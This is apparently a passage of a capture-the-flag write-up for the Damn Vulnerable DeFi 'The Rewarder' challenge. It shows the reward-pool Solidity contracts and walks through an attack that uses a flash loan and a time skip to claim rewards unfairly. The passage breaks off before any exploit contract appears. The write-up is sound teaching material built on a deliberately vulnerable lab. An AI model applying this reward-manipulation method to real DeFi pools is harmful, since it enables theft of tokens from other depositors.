+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">RewardToken</span> <span style="color:#00f">is</span> <span style="color:#000">ERC20</span>, <span style="color:#000">AccessControl</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">bytes32</span> <span style="color:#00f">public</span> <span style="color:#00f">constant</span> <span style="color:#000">MINTER_ROLE</span> = <span style="color:#000">keccak256</span>(<span style="color:#5a2">&#34;MINTER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>() <span style="color:#000">ERC20</span>(<span style="color:#5a2">&#34;Reward Token&#34;</span>, <span style="color:#5a2">&#34;RWT&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setupRole</span>(<span style="color:#000">DEFAULT_ADMIN_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setupRole</span>(<span style="color:#000">MINTER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">mint</span>(<span style="color:#00f">address</span> <span style="color:#000">to</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">hasRole</span>(<span style="color:#000">MINTER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_mint</span>(<span style="color:#000">to</span>, <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="24-therewarderpoolsol">2.4) <code>TheRewarderPool.sol</code></h3>
+<p>This is the most interesting contract for this challenge (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/TheRewarderPool.sol" target="_blank" rel="noopener noreffer ">source code</a>).</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">TheRewarderPool</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Minimum duration of each round of rewards in seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#00f">constant</span> <span style="color:#000">REWARDS_ROUND_MIN_DURATION</span> = <span style="color:#3af">5</span> <span style="color:#00f">days</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">public</span> <span style="color:#000">lastSnapshotIdForRewards</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">public</span> <span style="color:#000">lastRecordedSnapshotTimestamp</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">mapping</span>(<span style="color:#00f">address</span> =&gt; <span style="color:#00f">uint256</span>) <span style="color:#00f">public</span> <span style="color:#000">lastRewardTimestamps</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Token deposited into the pool by users
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#000">DamnValuableToken</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">liquidityToken</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Token used for internal accounting and snapshots
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#888;font-style:italic">// Pegged 1:1 with the liquidity token
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#000">AccountingToken</span> <span style="color:#00f">public</span> <span style="color:#000">accToken</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Token in which rewards are issued
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#000">RewardToken</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">rewardToken</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Track number of rounds
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">uint256</span> <span style="color:#00f">public</span> <span style="color:#000">roundNumber</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">tokenAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Assuming all three tokens have 18 decimals
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">liquidityToken</span> = <span style="color:#000">DamnValuableToken</span>(<span style="color:#000">tokenAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">accToken</span> = <span style="color:#00f">new</span> <span style="color:#000">AccountingToken</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#000">rewardToken</span> = <span style="color:#00f">new</span> <span style="color:#000">RewardToken</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_recordSnapshot</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">deposit</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amountToDeposit</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">amountToDeposit</span> &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;Must deposit tokens&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">accToken</span>.<span style="color:#000">mint</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amountToDeposit</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">distributeRewards</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">liquidityToken</span>.<span style="color:#000">transferFrom</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#000">amountToDeposit</span>)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">withdraw</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amountToWithdraw</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">accToken</span>.<span style="color:#000">burn</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amountToWithdraw</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">liquidityToken</span>.<span style="color:#000">transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amountToWithdraw</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">distributeRewards</span>() <span style="color:#00f">public</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">rewards</span> = <span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span>(<span style="color:#000">isNewRewardsRound</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#000">_recordSnapshot</span>();
+</span></span><span style="display:flex;"><span>        }        
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">totalDeposits</span> = <span style="color:#000">accToken</span>.<span style="color:#000">totalSupplyAt</span>(<span style="color:#000">lastSnapshotIdForRewards</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">amountDeposited</span> = <span style="color:#000">accToken</span>.<span style="color:#000">balanceOfAt</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">lastSnapshotIdForRewards</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> (<span style="color:#000">amountDeposited</span> &gt; <span style="color:#3af">0</span> &amp;&amp; <span style="color:#000">totalDeposits</span> &gt; <span style="color:#3af">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#000">rewards</span> = (<span style="color:#000">amountDeposited</span> * <span style="color:#3af">100</span> * <span style="color:#3af">10</span> ** <span style="color:#3af">18</span>) / <span style="color:#000">totalDeposits</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">if</span>(<span style="color:#000">rewards</span> &gt; <span style="color:#3af">0</span> &amp;&amp; !<span style="color:#000">_hasRetrievedReward</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#000">rewardToken</span>.<span style="color:#000">mint</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">rewards</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#000">lastRewardTimestamps</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#000">block</span>.<span style="color:#000">timestamp</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">rewards</span>;     
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_recordSnapshot</span>() <span style="color:#00f">private</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">lastSnapshotIdForRewards</span> = <span style="color:#000">accToken</span>.<span style="color:#000">snapshot</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#000">lastRecordedSnapshotTimestamp</span> = <span style="color:#000">block</span>.<span style="color:#000">timestamp</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">roundNumber</span>++;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_hasRetrievedReward</span>(<span style="color:#00f">address</span> <span style="color:#000">account</span>) <span style="color:#00f">private</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#000">lastRewardTimestamps</span>[<span style="color:#000">account</span>] &gt;= <span style="color:#000">lastRecordedSnapshotTimestamp</span> &amp;&amp;
+</span></span><span style="display:flex;"><span>            <span style="color:#000">lastRewardTimestamps</span>[<span style="color:#000">account</span>] &lt;= <span style="color:#000">lastRecordedSnapshotTimestamp</span> + <span style="color:#000">REWARDS_ROUND_MIN_DURATION</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">isNewRewardsRound</span>() <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">block</span>.<span style="color:#000">timestamp</span> &gt;= <span style="color:#000">lastRecordedSnapshotTimestamp</span> + <span style="color:#000">REWARDS_ROUND_MIN_DURATION</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>Let&rsquo;s see what each function does.</p>
+<ul>
+<li>
+<p>the <code>constructor</code> creates the <code>AccountingToken</code> and the <code>RewardToken</code> contracts. The reward pool contract has all the roles specified in both contracts (<code>MINTER_ROLE</code>, <code>BURNER_ROLE</code>, &hellip;).
+It also calls the private function <code>_recordSnapshot</code> to set some variables that will be used to determine when it&rsquo;s time to offer rewards</p>
+</li>
+<li>
+<p>the <code>deposit</code> function does the following:</p>
+<ul>
+<li>check if the amount deposited is <code>&gt;0</code> (line <code>50</code>)</li>
+<li>call the <code>mint</code> function of the <code>AccountingToken</code> contract to create <code>rTKN</code> tokens and sends them to the <code>msg.sender</code> (line <code>52</code>)</li>
+<li>call the <code>distributeRewards</code> function to see if it&rsquo;s time to distribute the rewards to the <code>msg.sender</code> (line <code>53</code>)</li>
+<li>check if the <code>msg.sender</code> has sent the same amount of <code>DVT</code> token to the pool (line <code>56</code>). We need first to approve the pool (by calling the <code>approve</code> function) to call the <code>tranferFrom</code> function</li>
+</ul>
+</li>
+<li>
+<p>the <code>withdraw</code> function does the following:</p>
+<ul>
+<li>call the <code>burn</code> function of the <code>AccountingToken</code> contract to burn <code>rTKN</code> (line <code>61</code>)</li>
+<li>send the amount of <code>DVT</code> tokens to withdraw to the <code>msg.sender</code> (line <code>62</code>)</li>
+</ul>
+</li>
+<li>
+<p>the <code>distributeRewards</code> is the function responsible for the logic of offering the rewards:</p>
+<ul>
+<li>the function <code>isNewRewardsRound</code> checks if at least <code>5</code> days have been passed before the <code>lastRecordedSnapshotTimestamp</code> (lines <code>68-70</code> and <code>101</code>). If this condition is <code>true</code> (this happens at intervals of <code>5</code> or more days), then it calls the <code>_recordSnapshot()</code> function that, in turn:
+<ul>
+<li>calls the <code>snapshot</code> function from the <code>AccountingToken</code> (line <code>88</code>) to create a new snapshot</li>
+<li>update the <code>lastRecordedSnapshotTimestamp</code> with the current timestamp (line <code>89</code>)</li>
+<li>increment the <code>roundNumber</code> by <code>1</code> (line <code>90</code>)</li>
+</ul>
+</li>
+<li>gets the total supply of <code>AccountingToken</code> that is available at the <code>lastRecordedSnapshotTimestamp</code>  (line <code>72</code>) and the <code>amountDeposited</code> of the sender at the same timestamp (line <code>73</code>)</li>
+<li>if both of the previous values are greater than <code>0</code> (line <code>75</code>), it computes the <code>rewards</code> to offer by dividing <code>amountDeposited</code> with <code>lastRecordedSnapshotTimestamp</code></li>
+<li>it checks if the <code>msg.sender</code> has already retrieved the reward by checking the value of the variable <code>lastRewardTimestamps</code> (line <code>78</code> and <code>95-96</code>)</li>
+<li>if the sender has not retrieved the reward yet and the <code>rewards</code> to offer is greater than <code>0</code>, then it calls the <code>mint</code> function of the <code>RewardingToken</code> contract to send these reward tokens to the sender</li>
+<li>finally, it updates <code>lastRewardTimestamps</code> for the <code>msg.sender</code> with the block timestamp of when the reward is received</li>
+</ul>
+</li>
+</ul>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>How can we call the deposit function?</strong></div>
+        </div>
+    </div>
+<p>To be eligible for some rewards, we need first to have some <code>rTKN</code> (<code>AccountingToken</code>). We can obtain some by calling the <code>deposit</code> function, but we don&rsquo;t have any <code>DVT</code> tokens, so we cannot approve any token transfer.
+However, we can use the <code>flashLoan</code> function to receive some <code>DVT</code> tokens as long as we pay them back.
+So, to deposit some <code>DVT</code> tokens and receive some <code>rTKN</code> tokens (1:1 ratio), we need first to call the <code>flashLoan</code> function and then approve the pool to spend our token.
+We need a contract that implements the <code>receiveEthers</code> function that the <code>flashLoan</code> function will call.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>How to get the reward?</strong></div>
+        </div>
+    </div>
+<p>Rewards are distributed if <code>5</code> or more days passed from the previous round. To &ldquo;move in time&rdquo; and avoid waiting <code>5</code> days, we can use
+the following function from the <code>ethers</code> library: <code>await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60])</code>.
+This way, when we will call the <code>deposit</code> function, the function <code>isNewRewardsRound()</code> will return <code>true</code>.
+Also, since we haven&rsquo;t retrieved any reward in that round and the value <code>amountDeposited</code> is greater than <code>0</code>, both the conditions at lines <code>75</code> and <code>78</code> will be <code>true</code>, and thus, we will receive the rewards (line <code>79</code>).</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>How to repay the flash loan?</strong></div>
+        </div>
+    </div>
